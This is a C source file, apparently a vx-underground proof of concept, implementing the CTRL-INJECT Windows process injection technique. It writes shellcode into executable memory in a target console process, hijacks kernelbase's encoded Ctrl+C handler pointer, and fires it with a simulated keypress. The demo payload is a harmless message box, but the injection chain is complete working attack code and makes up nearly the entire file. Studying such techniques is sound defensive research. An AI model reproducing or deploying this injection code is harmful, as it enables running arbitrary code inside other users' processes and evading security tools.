#include <Windows.h>
#include <Psapi.h>

/*
	This proof-of-concept has been developed by smelly__vx of vx-underground.

	This is NOT original research. This is a simplified version of CTRL INJECTION
	from other publicly available proof-of-concepts. Other proof-of-concepts were
	error prone, or were excessive in code - meaning they were heavily abstracted.

	This code base aims to show the technique in its simplest form. We encourage
	you to experiment with the code base, or try other memory writing techniques.

	This code was compiled in Visual Studio 2022, using C++ ISO 14 standard. This
	code base contains no C++ specific functionality, so it can very easily be
	converted to C.

	!!! CTRL INJECTION ONLY WORKS ON CONSOLE APPLICATIONS !!!

	0) An indepth explanation, as well as credit to the original author, (ensilo?)
	can be found here: https://papers.vx-underground.org/papers/Windows/Process%20Injection/Ctrl-Inject.pdf

	1) This code contains a manual implemention of 'memmem', this functionality is
	present in the Linux OS and associates libraries. Because it is not easily
	used on Windows it has been re-developed using code from KamilCuk. You can
	find more information on 'memmem' here: https://man7.org/linux/man-pages/man3/memmem.3.html
	It is named MemoryFindMemory in this code base.

	2) This code contains the function GenericShellcodeHelloWorldMessageBoxAEbFbLoop
	this function is a re-implemention of code from SafeBreach labs Pinjectra
	framework. It is a simple 'Hello World' MessageBoxA with an assembly instruction
	EB FE at the end. This is different than a traditional shellcode and/or PIC
	you'd find from MsfVenom or Donut. You can find more information about why this
	is implemention differently in the original paper from ENSILO and in this
	StackOverflow answer: https://stackoverflow.com/questions/25722107/x86-assembly-instruction

	3) Shout out to the other individuals who created proof-of-concepts for this
	process injection technique! 

	- Amit Klein, Itzik Kotler of SafeBreach-Labs/Pinjectra
	- TheEvilBit: CTRL-INJECT proof-of-concept

*/

PVOID MemoryFindMemory(_In_ PVOID Haystack, _In_ SIZE_T HaystackLength, _In_ PVOID Needle, _In_ SIZE_T NeedleLength)
{
	if (!Haystack || !HaystackLength || !Needle || !NeedleLength)
		return NULL;

	for (PCHAR pChar = (PCHAR)Haystack; HaystackLength >= NeedleLength; ++pChar, --HaystackLength)
	{
		if (!memcmp(pChar, Needle, NeedleLength))
			return pChar;
	}

	return NULL;
}

PCHAR GenericShellcodeHelloWorldMessageBoxAEbFbLoop(VOID)
{
	UCHAR RawPayloadBuffer[] =
		"\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8"
		"\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48"
		"\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48"
		"\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28"
		"\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00"
		"\x00\x00\x00\xEB\xFE";

	DWORD RawBufferSize = 71;
	PCHAR Payload;
	LONGLONG OffsetText = 0x4444444444444444;
	CHAR Text[8] = "Hello!";
	LONGLONG OffsetCaption = 0x5555555555555555;
	CHAR Caption[8] = "World";
	LONGLONG OffsetFunction = 0x3333333333333333;
	PVOID FunctionPointer = MessageBoxA;

	Payload = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RawBufferSize);
	if (Payload == NULL)
		return NULL;

	CopyMemory(Payload, RawPayloadBuffer, RawBufferSize);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetText, 8), Text, 8);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetCaption, 8), Caption, 8);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetFunction, 8), &FunctionPointer, 8);

	return Payload;
}

INT main(VOID)
{
	typedef NTSTATUS(NTAPI* RTLENCODEREMOTEPOINTER)(HANDLE, PVOID, PVOID*);
	RTLENCODEREMOTEPOINTER RtlEncodeRemotePointer = NULL;
	HMODULE hNtdll = NULL;
	HMODULE hKernelbase = NULL;
	MODULEINFO KernelbaseInformation = { 0 };
	PCHAR KernelBaseDefaultHandler = NULL;
	PCHAR KernelBaseSingleHandler = NULL;
	DWORD64 Encoded = 0;
	DWORD ConsoleAttachList[2] = { 0 };
	DWORD ParentId = 0;
	HWND hWindow = NULL;
	PVOID EncodedAddress = NULL;
	HANDLE hHandle = NULL;
	LPVOID BaseAddress = NULL;
	INPUT Input = { 0 };


	DWORD dwError = ERROR_SUCCESS;  //error handler, if a function fails store it in this and return at end of main
	BOOL bFlag = FALSE;				//used to signal if the application is jmp-ing to exit routine indicating failure
	DWORD dwTargetPid = 0;			//set this to the target PID you'd like to target. I dont like using CMD lines lol

	LPBYTE Payload = (LPBYTE)GenericShellcodeHelloWorldMessageBoxAEbFbLoop();
	DWORD dwPayloadSizeInBytes = 71;
	
	//The code base officially starts here =D
	hNtdll = GetModuleHandleW(L"ntdll.dll");
	hKernelbase = GetModuleHandleW(L"kernelbase.dll");

	if (!hNtdll || !hKernelbase)	
		goto EXIT_ROUTINE;

	RtlEncodeRemotePointer = (RTLENCODEREMOTEPOINTER)GetProcAddress(hNtdll, "RtlEncodeRemotePointer");
	if (!RtlEncodeRemotePointer)	
		goto EXIT_ROUTINE;			

	if (!K32GetModuleInformation(GetCurrentProcess(), hKernelbase, &KernelbaseInformation, sizeof(KernelbaseInformation)))
		goto EXIT_ROUTINE;

	KernelBaseDefaultHandler = (PCHAR)MemoryFindMemory(hKernelbase, KernelbaseInformation.SizeOfImage, (PVOID)"\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9);
	if (KernelBaseDefaultHandler == NULL)
		goto EXIT_ROUTINE;

	Encoded = (DWORD64)EncodePointer(KernelBaseDefaultHandler);
	if (Encoded == 0)
		goto EXIT_ROUTINE;

	KernelBaseSingleHandler = (PCHAR)MemoryFindMemory(hKernelbase, KernelbaseInformation.SizeOfImage, &Encoded, 8);
	if (KernelBaseSingleHandler == NULL)
		goto EXIT_ROUTINE;

	if (GetConsoleProcessList(ConsoleAttachList, 2) < 2)
		goto EXIT_ROUTINE;

	if (ConsoleAttachList[0] != GetCurrentProcessId())
		ParentId = ConsoleAttachList[0];
	else
		ParentId = ConsoleAttachList[1];

	FreeConsole();
	AttachConsole(dwTargetPid);

	hWindow = GetConsoleWindow();

	FreeConsole();
	AttachConsole(ParentId);

	hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwTargetPid);

	BaseAddress = VirtualAllocEx(hHandle, NULL, dwPayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BaseAddress == NULL)
		goto EXIT_ROUTINE;

	if (!WriteProcessMemory(hHandle, BaseAddress, Payload, dwPayloadSizeInBytes, NULL))
		goto EXIT_ROUTINE;

	CloseHandle(hHandle);

	hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwTargetPid);
	if (hHandle == NULL)
		goto EXIT_ROUTINE;

	RtlEncodeRemotePointer(hHandle, BaseAddress, &EncodedAddress);

	if (!WriteProcessMemory(hHandle, KernelBaseSingleHandler, &EncodedAddress, 8, NULL))
		goto EXIT_ROUTINE;

	Input.type = INPUT_KEYBOARD;
	Input.ki.wScan = 0;
	Input.ki.time = 0;
	Input.ki.dwExtraInfo = 0;
	Input.ki.wVk = VK_CONTROL;
	Input.ki.dwFlags = 0; // 0 for key press

	SendInput(1, &Input, sizeof(INPUT));
	Sleep(100);

	PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);

	Sleep(100);

	Input.type = INPUT_KEYBOARD;
	Input.ki.wScan = 0;
	Input.ki.time = 0;
	Input.ki.dwExtraInfo = 0;
	Input.ki.wVk = VK_CONTROL;
	Input.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &Input, sizeof(INPUT));

	RtlEncodeRemotePointer(hHandle, KernelBaseDefaultHandler, &EncodedAddress);

	if (!WriteProcessMemory(hHandle, KernelBaseSingleHandler, &EncodedAddress, 8, NULL))
		goto EXIT_ROUTINE;

	bFlag = TRUE;


	bFlag = TRUE;					

EXIT_ROUTINE:

	if (!bFlag)
		dwError = GetLastError();	

	if (Payload)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Payload);

	if (hHandle)
		CloseHandle(hHandle);

	return dwError;
}